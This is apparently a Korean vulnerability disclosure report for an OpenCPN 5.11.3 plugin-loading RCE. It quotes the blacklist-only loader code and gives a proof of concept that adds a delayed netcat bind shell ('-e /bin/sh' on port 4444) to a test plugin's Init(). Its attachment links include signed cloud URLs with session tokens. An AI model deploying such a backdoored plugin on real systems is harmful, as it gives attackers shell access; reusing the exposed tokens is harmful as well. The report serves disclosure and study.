---
notion_url: https://www.notion.so/04dbe0809830835ea2c801a5a65a41d1
last_synced: 2026-06-12 05:51
tags: [notion-sync]
---

# [KOR] OpenCPN RCE - Code Injection

취약점 제목 : OpenCPN RCE - Code Injection
취약점 요약 : 서명, 경로, 화이트리스트 검증이 없는 동적 라이브러리 링크 파일을 load 함으로써 발생하는 Remote Code Execution
제조사 : Github OpenSource Project
소프트웨어명 : OpenCPN
버전 : 5.11.3
소프트웨어 유형 : ECS (Electronic Chart System)
공격 유형 : Code Injection
영향 : 프로세스 권한의 Remote Code Execution
취약한 파일명 : plugin_loader.cpp
취약한 함수명 : PluginLoader::LoadPlugIn()
취약한 파라미터 : const wxString& plugin_file, PlugInContainer* pic
취약점 발생 환경 : Ubuntu 24.04

Proof Of Concept  : 
Library를 로드하는 과정 중 검증과정이 블랙리스트 기반 검증밖에 없는것을 확인

```c++
// Check if blacklisted, exit if so.
  auto sts =
      m_blacklist->get_status(pic->m_common_name.ToStdString(),
                              pic->m_version_major, pic->m_version_minor);
  if (sts != plug_status::unblocked) {
    wxLogDebug("Refusing to load blacklisted plugin: %s",
               pic->m_common_name.ToStdString().c_str());
    return nullptr;
  }
  auto data = m_blacklist->get_library_data(plugin_file.ToStdString());
  if (!data.name.empty()) {
    wxLogDebug("Refusing to load blacklisted library: %s",
               plugin_file.ToStdString().c_str());
    return nullptr;
  }
  pic->m_plugin_file = plugin_file;
  pic->m_status =
      PluginStatus::Unmanaged;  // Status is updated later, if necessary

  // load the library
  if (pic->m_library.IsLoaded()) pic->m_library.Unload();
  pic->m_library.Load(plugin_file);

  if (!pic->m_library.IsLoaded()) {
    //  Look in the Blacklist, try to match a filename, to give some kind of
    //  message extract the probable plugin name
    wxFileName fn(plugin_file);
    std::string name = fn.GetName().ToStdString();
    auto found = m_blacklist->get_library_data(name);
    if (m_blacklist->mark_unloadable(plugin_file.ToStdString())) {
      wxLogMessage("Ignoring blacklisted plugin %s", name.c_str());
      if (!found.name.empty()) {
        SemanticVersion v(found.major, found.minor);
        LoadError le(LoadError::Type::Unloadable, name, v);
        load_errors.push_back(le);
      } else {
        LoadError le(LoadError::Type::Unloadable, plugin_file.ToStdString());
        load_errors.push_back(le);
      }
    }
    wxLogMessage(wxString("   PluginLoader: Cannot load library: ") +
                 plugin_file);
    return nullptr;
  }
```

깃허브에서 OpenCPN용 TestPlugin 템플릿을 받아와 예시 RCE로 바인드 쉘을 사용
https://github.com/jongough/testplugin_pi.git
`src/testplugin_pi.cpp` 의 `Init()` 최상단에 다음을 추가:

```c++
#include <thread>
#include <chrono>
#include <cstdlib>
+#include <fstream>

int testplugin_pi::Init(void)
{
+    // Init() 호출 확인 로그
+    std::ofstream fs("/home/user/poc_init.log");
+    fs << "Init() 호출됨\n";
+    fs.close();
+
    // … 기존 초기화 로직 …

+    // 5초 후 바인드 셸 실행 (PoC 예시)
+    std::thread([](){
+        std::this_thread::sleep_for(std::chrono::seconds(5));
+        system("/usr/bin/nc.traditional -lvp 4444 -e /bin/sh &");
+    }).detach();


```

빌드 후 OpenCPN 내부에서 Plugin을 Import 하면

![image](_assets/image.png)

nc 명령으로 쉘 접속 가능함을 알수 있습니다.

취약점 기타 (파일 첨부 영상, 보고서 첨부) :

> 📎 첨부(미변환): [POC2.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/92bdd4ae-35e4-4636-a8a3-fce96cfbfd0f/POC2.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4665EWAX4GK%2F20260611%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260611T205114Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDwaCXVzLXdlc3QtMiJHMEUCIAKkOMduClgubjxjGlFU3XxS%2BqduKvwOvPFMo77x1pIdAiEAuW31FpWr8rSIvxHrIKKaGo4md2POv5JcLz58ub3YvIYq%2FwMIBRAAGgw2Mzc0MjMxODM4MDUiDKGIKrYTzTgmiK7t%2FCrcA2p7g5sE8009bS2Ft2kh47NBdrSbYhgq847MMIW5TuU4OrXFkFO1RowB18RxpmQmb0%2BQtPmt5i9fXRemFSBgzXVcY9C8FslNqcputUfjLdRpyX1pDdDqgDFIQOsWjj3RRHSb3p8oU%2FJaRUvi7EN3S%2Fu13KopaaBx%2F7u9naRd3n%2Brir69%2BADVodC2Adlne5CglRYCRAA997P4gIa6VWNrsLo0D8sAkFeITR12eIzb%2FRNKGoCegKg9%2FoOD6aPtn0ijY8aEwdDajsBq%2F2SED4jNpJvyIfM2bY6qMfqtb%2Fi32m%2FqUlxmWGBcMxbX%2Fz3Bn4b5OM4P%2FshSXilcGvQMerF8xWeCC1cliblTkXUEUCBGRD6qvpelc8seHKh7ca%2FDgYQoIix7wtqhm94w2w2c0AT2ORCPrZL0J3tCmZgeGE3lUYWMrg6XVf0VPZcvFf5AFtttk5B7BU5iXJymRIevqiBS9NK4XCc3vkyvNjMDTjy0A5Pitft3HZt1WGsy7HeZmJD3a72ILqDFG4cpxGAm4LdD4Hu43rB%2BkfYPDLiV6J3EcomDS9Vhry%2FsxtnmwHQvorPlnjSVCLEYP2YxCNaf8DydTyQFYbqCo67IUTPE2Z8SOjnjAZbYO%2FYvrGqEP2bpMNurrNEGOqUBH4wxxB4xwuM%2FEHGOZzPGWMhPYz2IhcOKp5aEFxa6P4rXpNQgBeuVD6BZkdOHKcc8NpV%2BKWW6Ahh1tKmoq3g35RJ00Cc5ZVE67e4cb%2FAwTNoQM1NeBilT54e2rN29ZIzsRq8sFhKH6vdx11zA28sVRDqm6JxpMk8zg%2FO1RvvHN0GrkZcIv6TzHOZgqWUJha7D49weAH9CeRx0LKmtPWUVo9VyykQY&X-Amz-Signature=96165d7029d872ae428210e1238ffd1abee83bef35e9dadc225e2347c46da7f3&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)




> 📎 첨부(미변환): [zdi report2.txt](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/f9e232eb-7be1-4217-8bad-eca58c969748/zdi_report2.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4665EWAX4GK%2F20260611%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260611T205114Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDwaCXVzLXdlc3QtMiJHMEUCIAKkOMduClgubjxjGlFU3XxS%2BqduKvwOvPFMo77x1pIdAiEAuW31FpWr8rSIvxHrIKKaGo4md2POv5JcLz58ub3YvIYq%2FwMIBRAAGgw2Mzc0MjMxODM4MDUiDKGIKrYTzTgmiK7t%2FCrcA2p7g5sE8009bS2Ft2kh47NBdrSbYhgq847MMIW5TuU4OrXFkFO1RowB18RxpmQmb0%2BQtPmt5i9fXRemFSBgzXVcY9C8FslNqcputUfjLdRpyX1pDdDqgDFIQOsWjj3RRHSb3p8oU%2FJaRUvi7EN3S%2Fu13KopaaBx%2F7u9naRd3n%2Brir69%2BADVodC2Adlne5CglRYCRAA997P4gIa6VWNrsLo0D8sAkFeITR12eIzb%2FRNKGoCegKg9%2FoOD6aPtn0ijY8aEwdDajsBq%2F2SED4jNpJvyIfM2bY6qMfqtb%2Fi32m%2FqUlxmWGBcMxbX%2Fz3Bn4b5OM4P%2FshSXilcGvQMerF8xWeCC1cliblTkXUEUCBGRD6qvpelc8seHKh7ca%2FDgYQoIix7wtqhm94w2w2c0AT2ORCPrZL0J3tCmZgeGE3lUYWMrg6XVf0VPZcvFf5AFtttk5B7BU5iXJymRIevqiBS9NK4XCc3vkyvNjMDTjy0A5Pitft3HZt1WGsy7HeZmJD3a72ILqDFG4cpxGAm4LdD4Hu43rB%2BkfYPDLiV6J3EcomDS9Vhry%2FsxtnmwHQvorPlnjSVCLEYP2YxCNaf8DydTyQFYbqCo67IUTPE2Z8SOjnjAZbYO%2FYvrGqEP2bpMNurrNEGOqUBH4wxxB4xwuM%2FEHGOZzPGWMhPYz2IhcOKp5aEFxa6P4rXpNQgBeuVD6BZkdOHKcc8NpV%2BKWW6Ahh1tKmoq3g35RJ00Cc5ZVE67e4cb%2FAwTNoQM1NeBilT54e2rN29ZIzsRq8sFhKH6vdx11zA28sVRDqm6JxpMk8zg%2FO1RvvHN0GrkZcIv6TzHOZgqWUJha7D49weAH9CeRx0LKmtPWUVo9VyykQY&X-Amz-Signature=b662aa34060e795dfcc4d6620c0c4e919358079ff28a78b78d5fd696a246c668&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
